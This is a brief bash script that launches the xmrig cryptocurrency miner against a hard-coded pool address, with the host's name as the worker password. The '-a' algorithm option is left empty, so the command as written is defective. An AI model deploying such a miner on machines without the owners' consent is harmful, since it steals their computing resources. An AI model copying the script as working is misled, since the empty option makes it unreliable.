#!/bin/bash
cd "$(dirname "$0")"

./xmrig \
  -o 96.126.108.160:1337 \
  -u Dream \
  -p ${HOSTNAME:-dream} \
  -a  \
  --donate-level 1
